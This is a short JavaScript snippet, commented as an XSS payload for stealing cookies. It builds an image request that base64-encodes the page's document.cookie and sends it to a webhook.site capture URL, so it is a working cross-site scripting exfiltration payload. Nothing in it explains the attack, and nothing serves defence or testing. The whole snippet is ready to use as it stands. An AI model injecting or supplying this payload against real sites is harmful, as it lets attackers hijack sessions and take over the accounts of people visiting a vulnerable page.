// XSS Payload to steal cookies
var img = new Image();
img.src = 'https://webhook.site/9d455d5a-6bfc-43f8-a740-a0b11ceaa636?data=' + btoa(document.cookie);
